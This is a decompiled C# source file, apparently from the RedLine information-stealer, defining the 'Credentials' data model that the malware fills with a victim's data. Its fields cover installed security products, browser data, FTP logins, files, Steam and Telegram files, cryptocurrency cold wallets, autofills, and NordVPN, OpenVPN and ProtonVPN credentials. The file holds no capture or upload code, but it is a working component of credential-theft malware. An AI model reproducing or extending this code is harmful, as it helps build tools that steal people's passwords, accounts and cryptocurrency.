using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using RedLine.Client.Models;
using RedLine.Models.Browsers;

namespace RedLine.Models
{
	// Token: 0x0200000A RID: 10
	[DataContract(Name = "Credentials", Namespace = "v1/Models")]
	public class Credentials
	{
		// Token: 0x1700000F RID: 15
		// (get) Token: 0x0600002E RID: 46 RVA: 0x00002711 File Offset: 0x00000911
		// (set) Token: 0x0600002F RID: 47 RVA: 0x00002719 File Offset: 0x00000919
		[DataMember(Name = "Defenders")]
		public List<string> Defenders { get; set; } = new List<string>();

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x06000030 RID: 48 RVA: 0x00002722 File Offset: 0x00000922
		// (set) Token: 0x06000031 RID: 49 RVA: 0x0000272A File Offset: 0x0000092A
		[DataMember(Name = "Languages")]
		public List<string> Languages { get; set; } = new List<string>();

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000032 RID: 50 RVA: 0x00002733 File Offset: 0x00000933
		// (set) Token: 0x06000033 RID: 51 RVA: 0x0000273B File Offset: 0x0000093B
		[DataMember(Name = "InstalledSoftwares")]
		public List<string> InstalledSoftwares { get; set; } = new List<string>();

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x06000034 RID: 52 RVA: 0x00002744 File Offset: 0x00000944
		// (set) Token: 0x06000035 RID: 53 RVA: 0x0000274C File Offset: 0x0000094C
		[DataMember(Name = "Processes")]
		public List<string> Processes { get; set; } = new List<string>();

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x06000036 RID: 54 RVA: 0x00002755 File Offset: 0x00000955
		// (set) Token: 0x06000037 RID: 55 RVA: 0x0000275D File Offset: 0x0000095D
		[DataMember(Name = "Hardwares")]
		public List<Hardware> Hardwares { get; set; } = new List<Hardware>();

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x06000038 RID: 56 RVA: 0x00002766 File Offset: 0x00000966
		// (set) Token: 0x06000039 RID: 57 RVA: 0x0000276E File Offset: 0x0000096E
		[DataMember(Name = "Browsers")]
		public List<Browser> Browsers { get; set; } = new List<Browser>();

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x0600003A RID: 58 RVA: 0x00002777 File Offset: 0x00000977
		// (set) Token: 0x0600003B RID: 59 RVA: 0x0000277F File Offset: 0x0000097F
		[DataMember(Name = "FtpConnections")]
		public List<LoginPair> FtpConnections { get; set; } = new List<LoginPair>();

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x0600003C RID: 60 RVA: 0x00002788 File Offset: 0x00000988
		// (set) Token: 0x0600003D RID: 61 RVA: 0x00002790 File Offset: 0x00000990
		[DataMember(Name = "InstalledBrowsers")]
		public List<InstalledBrowserInfo> InstalledBrowsers { get; set; } = new List<InstalledBrowserInfo>();

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x0600003E RID: 62 RVA: 0x00002799 File Offset: 0x00000999
		// (set) Token: 0x0600003F RID: 63 RVA: 0x000027A1 File Offset: 0x000009A1
		[DataMember(Name = "Files")]
		public List<RemoteFile> Files { get; set; } = new List<RemoteFile>();

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x06000040 RID: 64 RVA: 0x000027AA File Offset: 0x000009AA
		// (set) Token: 0x06000041 RID: 65 RVA: 0x000027B2 File Offset: 0x000009B2
		[DataMember(Name = "SteamFiles")]
		public List<RemoteFile> SteamFiles { get; set; } = new List<RemoteFile>();

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x06000042 RID: 66 RVA: 0x000027BB File Offset: 0x000009BB
		// (set) Token: 0x06000043 RID: 67 RVA: 0x000027C3 File Offset: 0x000009C3
		[DataMember(Name = "ColdWallets")]
		public List<ColdWallet> ColdWallets { get; set; } = new List<ColdWallet>();

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x06000044 RID: 68 RVA: 0x000027CC File Offset: 0x000009CC
		// (set) Token: 0x06000045 RID: 69 RVA: 0x000027D4 File Offset: 0x000009D4
		[DataMember(Name = "ImportantAutofills")]
		public List<Autofill> ImportantAutofills { get; set; } = new List<Autofill>();

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x06000046 RID: 70 RVA: 0x000027DD File Offset: 0x000009DD
		// (set) Token: 0x06000047 RID: 71 RVA: 0x000027E5 File Offset: 0x000009E5
		[DataMember(Name = "NordVPN")]
		public List<LoginPair> NordVPN { get; set; }

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x06000048 RID: 72 RVA: 0x000027EE File Offset: 0x000009EE
		// (set) Token: 0x06000049 RID: 73 RVA: 0x000027F6 File Offset: 0x000009F6
		[DataMember(Name = "OpenVPN")]
		public List<RemoteFile> OpenVPN { get; set; }

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x0600004A RID: 74 RVA: 0x000027FF File Offset: 0x000009FF
		// (set) Token: 0x0600004B RID: 75 RVA: 0x00002807 File Offset: 0x00000A07
		[DataMember(Name = "ProtonVPN")]
		public List<RemoteFile> ProtonVPN { get; set; }

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x0600004C RID: 76 RVA: 0x00002810 File Offset: 0x00000A10
		// (set) Token: 0x0600004D RID: 77 RVA: 0x00002818 File Offset: 0x00000A18
		[DataMember(Name = "TelegramFiles")]
		public List<RemoteFile> TelegramFiles { get; set; }
	}
}
